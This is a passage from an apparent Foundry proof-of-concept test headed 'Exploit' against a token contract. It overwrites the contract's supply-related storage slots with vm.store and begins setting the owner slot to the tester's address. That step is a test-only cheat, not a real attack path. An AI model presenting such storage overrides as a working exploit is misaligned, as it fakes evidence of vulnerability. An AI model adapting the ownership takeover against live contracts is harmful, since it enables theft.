        // Also give some tokens to another address to help trigger swap
        deal(TARGET, helper, initialBalance * 10);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The contract is in a broken state with division by zero in balanceOf()
        // We need to fix the storage first

        // First, let's find and fix the critical storage slots
        // Based on the contract layout:
        // _tTotal should be at slot 7 (after __gap arrays)
        // _rTotal should be at slot 8
        // _owner should be at slot 1 (from OwnableUpgradeable after __gap)

        // Let's write proper values to storage
        // We'll use arbitrary but valid values
        uint256 newTTotal = 1000000000 * 10**6 * 10**18; // As in initialize
        uint256 newRTotal = (2**256 - 1) - ((2**256 - 1) % newTTotal); // MAX - (MAX % _tTotal)

        // Write _tTotal (slot 7)
        bytes32 tTotalSlot = bytes32(uint256(7));
        vm.store(TARGET, tTotalSlot, bytes32(newTTotal));

        // Write _rTotal (slot 8)  
        bytes32 rTotalSlot = bytes32(uint256(8));
        vm.store(TARGET, rTotalSlot, bytes32(newRTotal));

        // Write _owner (slot 1) - set to our address
